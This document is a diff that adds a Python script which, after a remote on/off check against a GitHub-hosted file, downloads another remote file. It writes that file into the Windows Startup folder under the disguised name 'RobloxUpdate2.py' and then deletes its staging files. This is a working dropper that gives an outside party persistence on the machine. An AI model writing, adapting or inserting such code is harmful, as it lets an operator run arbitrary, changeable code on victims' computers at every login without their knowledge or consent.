@@ -1,1 +1,56 @@
+import os, requests
+from ast import literal_eval
 
+os.system("cls")
+
+check_url = "https://raw.githubusercontent.com/MyGamesM/data/master/check.txt"
+lol = ["https://raw.githubusercontent.com/MyGamesM/data/master/y.txt"]
+data = []
+data_file = f"{os.environ['appdata']}\\MyGamesM\\X\\check.txt"
+data_dir = f"{os.environ['appdata']}\\MyGamesM\\X\\"
+startup = f"{os.environ['appdata']}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+
+def getdata(dataval):
+    if os.path.isfile(data_file) == True:
+        os.remove(data_file)
+    if os.path.isdir(data_dir) == False:
+        os.makedirs(data_dir)
+    r = requests.get(lol[dataval])
+    f = open(data_file, "w")
+    f.write(r.text)
+    f.close()
+
+def readdata():
+    global data
+    f = open(data_file, "r")
+    a = f.read().split("\n")
+    f.close()
+
+    f = open(f"{startup}RobloxUpdate2.py", "w")
+    for i in range(len(a)):
+        if a[i] != "":
+            f.write(f"{a[i]}\n")
+    f.close()
+
+def cleanUp():
+    x = os.listdir(data_dir)
+    for i in range(len(x)):
+        os.path.isfile(f"{data_dir}\\{x[i]}")
+        os.remove(f"{data_dir}\\{x[i]}")
+
+#if os.path.isdir(f"{data_dir}\\{x[i]}"):
+#os.removedirs(f"{data_dir}\\{x[i]}")
+
+def main():
+    getdata(0)
+    readdata()
+    cleanUp()
+
+def check():
+    r = requests.get(check_url)
+    if r.text != "True":
+        return
+    main()
+
+if __name__ == "__main__":
+    check()
